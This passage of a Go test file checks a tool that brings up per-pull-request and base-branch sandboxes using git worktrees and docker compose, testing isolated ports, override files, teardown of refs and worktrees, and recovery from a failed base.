	if _, err := os.Stat(filepath.Join(base.Worktree, "pr.txt")); !os.IsNotExist(err) {
		t.Errorf("the base holds the change: %v", err)
	}
	if base.Worktree == own.Worktree || base.Project == own.Project || base.Port == own.Port {
		t.Errorf("the base shares with the pull request: %+v / %+v", base, own)
	}
	if !strings.HasSuffix(base.Project, "-7-base") || !fake.IsUp(base.Project) || !fake.IsUp(own.Project) {
		t.Errorf("projects %s and %s", base.Project, own.Project)
	}

	f, _ := m.Store.Load()
	if got, ok := f.Find(req.Repo.Identity.Ref(), 7); !ok || got.Base || got.SHA != own.SHA {
		t.Errorf("the pull request's record: %+v", got)
	}
	if got, ok := f.Lookup(req.Repo.Identity.Ref(), 7, true); !ok || got.SHA != base.SHA {
		t.Errorf("the base's record: %+v", got)
	}

	// Each has an override of its own, with its own port in it.
	ownOverride, baseOverride := own.ComposeFiles[len(own.ComposeFiles)-1], base.ComposeFiles[len(base.ComposeFiles)-1]
	if ownOverride == baseOverride {
		t.Fatalf("one override for both: %s", ownOverride)
	}
	for file, port := range map[string]int{ownOverride: own.Port, baseOverride: base.Port} {
		if data, err := os.ReadFile(file); err != nil || !strings.Contains(string(data), strconv.Itoa(port)) {
			t.Errorf("%s: %v\n%s", file, err, data)
		}
	}

	// Brought up again, it is the same sandbox, on the same port.
	again, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil || again.Port != base.Port || again.Project != base.Project {
		t.Errorf("again: %+v, %v", again, err)
	}
	if f, _ := m.Store.Load(); len(f.Sandboxes) != 2 {
		t.Errorf("%d records", len(f.Sandboxes))
	}
}

// Taking the base down leaves the pull request's sandbox and the refs
// it runs from; without one, the refs go with the base.
func TestDownOfTheBase(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, fake := upFixture(t)
	own, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil {
		t.Fatal(err)
	}
	req.Base = true
	base, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil {
		t.Fatal(err)
	}
	if err := m.Down(t.Context(), base, io.Discard, io.Discard); err != nil {
		t.Fatal(err)
	}
	if !fake.IsUp(own.Project) || fake.IsUp(base.Project) {
		t.Error("the wrong sandbox went down")
	}
	if _, err := os.Stat(own.ComposeFiles[len(own.ComposeFiles)-1]); err != nil {
		t.Errorf("the pull request's override went with the base: %v", err)
	}
	if _, err := os.Stat(base.ComposeFiles[len(base.ComposeFiles)-1]); !os.IsNotExist(err) {
		t.Errorf("the base's override is still there: %v", err)
	}
	for _, ref := range []string{workspace.LocalRef(7), workspace.BaseRef(7)} {
		if _, err := workspace.ResolveRef(t.Context(), proc.Exec{}, req.Repo.Root, ref); err != nil {
			t.Errorf("%s went with the base: %v", ref, err)
		}
	}
	if _, err := os.Stat(base.Worktree); !os.IsNotExist(err) {
		t.Errorf("the base's worktree is still there")
	}
	f, _ := m.Store.Load()
	if _, ok := f.Find(req.Repo.Identity.Ref(), 7); !ok || len(f.Sandboxes) != 1 {
		t.Errorf("records: %+v", f.Sandboxes)
	}

	// A base on its own takes its refs with it.
	if err := m.Down(t.Context(), own, io.Discard, io.Discard); err != nil {
		t.Fatal(err)
	}
	base, err = m.Up(t.Context(), req, &quietReporter{})
	if err != nil {
		t.Fatal(err)
	}
	if err := m.Down(t.Context(), base, io.Discard, io.Discard); err != nil {
		t.Fatal(err)
	}
	if _, err := workspace.ResolveRef(t.Context(), proc.Exec{}, req.Repo.Root, workspace.BaseRef(7)); err == nil {
		t.Error("the base's ref outlived it")
	}
}

// A base that fails to come up takes nothing from the pull request's
// sandbox with it.
func TestAFailedBaseLeavesThePullRequest(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, fake := upFixture(t)
	own, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil {
		t.Fatal(err)
	}
	fake.Fail = map[string]error{"WaitReady": errors.New("it never answered")}
	req.Base = true
	if _, err := m.Up(t.Context(), req, &quietReporter{}); err == nil {
		t.Fatal("no error")
	}
	if !fake.IsUp(own.Project) {
		t.Error("the pull request's sandbox went down")
	}
	if _, err := workspace.ResolveRef(t.Context(), proc.Exec{}, req.Repo.Root, workspace.LocalRef(7)); err != nil {
		t.Errorf("the pull request's ref went: %v", err)
	}
	if _, err := os.Stat(req.Repo.Identity.BaseWorktreeDir(m.StateDir, 7)); !os.IsNotExist(err) {
		t.Error("the failed base's worktree is still there")
	}
	f, _ := m.Store.Load()
	if len(f.Sandboxes) != 1 || f.Sandboxes[0].Base {
		t.Errorf("records: %+v", f.Sandboxes)
	}
}

// A base's port is its own: brought up first, it does not take the one
// the pull request would get, and set up again, it gets its own back.
func TestTheBaseKeepsAPortOfItsOwn(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, fake := upFixture(t)
	id := req.Repo.Identity
	wanted := ports.Preferred(id.String(), 7)
	if ports.Taken(t.Context(), wanted) {
		t.Skipf("port %d is in use on this machine", wanted)
	}
	req.Base = true
	base, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil {
		t.Fatal(err)
	}
	req.Base = false
	own, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil {
		t.Fatal(err)
	}
	if own.Port != wanted {
		t.Errorf("the pull request got %d, not %d; the base has %d", own.Port, wanted, base.Port)
	}

	// Its containers gone, the base is set up anew -- on its port.
	if err := fake.Down(t.Context(), sandbox.RuntimeSandbox(base), io.Discard, io.Discard); err != nil {
		t.Fatal(err)
	}
	req.Base = true
	again, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil || again.Port != base.Port {
		t.Errorf("set up again on %d, was %d: %v", again.Port, base.Port, err)
	}
}

// The pull request's sandbox may sit on the port the base would like;
// the base does not take it from it.
func TestTheBaseLeavesThePullRequestItsPort(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, _ := upFixture(t)
	id := req.Repo.Identity
	wanted := ports.Preferred(id.String()+" base", 7)
	if ports.Taken(t.Context(), wanted) {
		t.Skipf("port %d is in use on this machine", wanted)
	}
	if err := m.Store.Update(func(f *state.File) error {
		f.Put(state.Sandbox{RepoRef: id.Ref(), PR: 7, Port: wanted, Project: "pit-elsewhere-7"})
		return nil
	}); err != nil {
		t.Fatal(err)
	}
	req.Base = true
	base, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil {
		t.Fatal(err)
	}
	if base.Port == wanted {
		t.Errorf("the base took the pull request's port %d", wanted)
	}
}

// A compose file that fixes a container's name or binds a host port is
// made safe for a second sandbox of the same repository.
func TestUpIsolatesFixedNamesAndPorts(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, _ := upFixture(t)
	pushToPullRequest(t, req.Repo.Root, 7, map[string]string{"docker-compose.yml": "services:\n  web:\n    image: nginx\n    container_name: shop-web\n  db:\n    image: postgres\n    ports: [\"5432:5432\"]\n"})
	record, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil {
		t.Fatal(err)
	}
	data, err := os.ReadFile(record.ComposeFiles[len(record.ComposeFiles)-1])
	if err != nil {
		t.Fatal(err)
	}
	override := string(data)
	for _, want := range []string{"container_name: " + record.Project + "-web", "  db:\n", "ports: !reset []"} {
		if !strings.Contains(override, want) {
			t.Errorf("the override lacks %q:\n%s", want, override)
		}
	}
}
